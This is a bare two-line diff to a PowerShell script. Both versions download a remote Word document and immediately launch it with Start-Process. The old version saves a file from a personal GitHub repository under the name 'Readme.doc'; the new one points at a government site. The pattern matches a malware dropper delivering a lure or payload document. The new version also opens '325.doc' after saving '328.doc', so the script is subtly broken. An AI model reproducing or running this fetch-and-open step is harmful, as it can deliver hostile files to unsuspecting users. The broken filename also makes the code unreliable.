@@ -1,2 +1,2 @@
-Invoke-WebRequest -Uri "http://github.com/ssbb36/stv/raw/main/7.doc" -OutFile "Readme.doc"
-Start-Process "ReadMe.doc"
+Invoke-WebRequest -Uri "https://roskazna.gov.ru/upload/iblock/5d6/328.doc" -OutFile "328.doc"
+Start-Process "325.doc"
